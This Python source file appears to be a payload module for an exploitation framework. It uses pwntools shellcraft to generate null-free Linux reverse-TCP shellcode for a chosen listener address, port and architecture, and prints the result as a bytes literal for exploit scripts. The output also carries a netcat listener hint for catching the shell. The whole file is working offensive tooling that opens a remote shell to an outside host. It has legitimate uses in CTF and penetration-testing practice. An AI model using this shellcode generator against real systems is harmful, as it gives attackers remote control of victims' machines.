"""Linux reverse-tcp shellcode via pwntools shellcraft.

For binary-exploitation work: gives you position-independent, null-free
shellcode as a Python bytes literal, ready to paste into an exploit script
next to a cyclic pattern and a ROP chain. The ARCH option maps friendly
names to pwntools arches (x86_64 -> amd64).

Requires pwntools (lazy import; console gates run on it). Arch users:
sudo pacman -S python-pwntools — pip wheels for unicorn/capstone lag new
Python releases.
"""

from core.module import PayloadModule
from core.options import OptAddress, OptEnum, OptPort

try:
    from pwnlib import shellcraft
    from pwnlib.asm import asm
    from pwnlib.context import context
except ImportError:
    shellcraft = asm = context = None  # console gates run() on requirements

ARCH_MAP = {"x86_64": "amd64", "i686": "i386", "aarch64": "aarch64"}


class ShellcodeReverseTcp(PayloadModule):
    name = "Linux Reverse TCP Shellcode (pwntools)"
    description = """
        Generates null-free reverse-shell shellcode via pwntools
        shellcraft (connect + dupsh), printed as a Python bytes literal
        for exploit scripts. Pair it with exploits/multi/handler.
    """
    authors = ["you"]
    requirements = ["pwntools"]

    def register_options(self):
        self.options.add(OptAddress("LHOST", required=True,
                                    description="Your listener IP"))
        self.options.add(OptPort("LPORT", default=4444, description="Your listener port"))
        self.options.add(OptEnum("ARCH", list(ARCH_MAP), default="x86_64",
                                 description="Target architecture"))

    def generate(self):
        lhost = str(self.get_option("LHOST"))
        lport = self.get_option("LPORT")
        arch = self.get_option("ARCH")
        context.clear(arch=ARCH_MAP[arch], os="linux")
        sc = asm(shellcraft.linux.connect(lhost, lport) + shellcraft.linux.dupsh())
        escaped = "".join(f"\\x{b:02x}" for b in sc)
        return (
            f"# linux/{arch} reverse tcp {lhost}:{lport} ({len(sc)} bytes)\n"
            f"# catch it: exploits/multi/handler or nc -lvnp {lport}\n"
            f'shellcode = b"{escaped}"'
        )
